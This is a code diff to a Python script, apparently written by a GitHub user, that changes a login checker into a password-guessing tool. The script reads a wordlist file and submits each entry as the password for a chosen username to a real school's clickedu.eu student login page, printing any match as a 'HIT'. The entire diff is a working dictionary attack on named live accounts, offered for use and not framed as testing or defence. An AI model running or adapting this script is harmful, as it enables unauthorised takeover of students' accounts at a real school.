@@ -4,11 +4,16 @@ import sys, requests, re
 if len(sys.argv) == 3:
    print("\nMade by https://github.com/antonchu2006")
 else:
-    print("\n[!] USAGE: python3" + sys.argv[0] + " <username> <passwd>")
+    print("\n[!] USAGE: python3" + sys.argv[0] + " <username> <combo_name>")
     sys.exit(1)
- 
 
-def checker(username, password):
+username = sys.argv[1]
+
+filename = str(sys.argv[2])
+with open(filename) as f:
+    content = f.read().splitlines()
+for line in content:
+
 
     ## Obtener el PHPSESSID
 
@@ -20,14 +25,11 @@ def checker(username, password):
 
     url2 = "https://escolarosaliadecastro.clickedu.eu/user.php?action=doLogin"
     cookies = { "cookiescheck": "true", "PHPSESSID": PHPSESSID }
-    post_data = { "username": username, "password": password, "button": "Inicia" }
+    post_data = { "username": username, "password": line, "button": "Inicia" }
 
     r2 = requests.post(url2, cookies=cookies, data=post_data).text
     
+
     if(re.search(r"window.location.href='students/index.php';", r2)):
-        return True
-    else:
-        return False
-
-print(checker(str(sys.argv[1]), str(sys.argv[2])))
-
+        print("\n[+] HIT: " + username + ":" + line)
+        sys.exit(0)
